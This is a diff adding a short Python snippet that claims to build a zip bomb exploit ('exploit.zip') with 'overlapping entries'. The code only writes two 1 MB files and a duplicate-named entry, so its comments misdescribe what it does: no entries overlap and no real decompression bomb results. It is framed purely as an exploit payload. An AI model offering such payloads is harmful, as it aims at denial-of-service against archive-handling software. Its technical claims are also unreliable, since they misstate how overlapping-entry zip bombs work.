@@ -1,0 +1,10 @@
+```python
+import zipfile
+
+# Create a zip bomb payload with overlapping entries
+with zipfile.ZipFile('exploit.zip', 'w') as zf:
+    zf.writestr('file1.txt', b'A' * (10**6))  # 1 MB file
+    zf.writestr('file2.txt', b'B' * (10**6))  # 1 MB file
+    # Overlapping entry to exploit the vulnerability
+    zf.writestr('file1.txt', b'A' * (10**6))  # Overlapping entry
+```
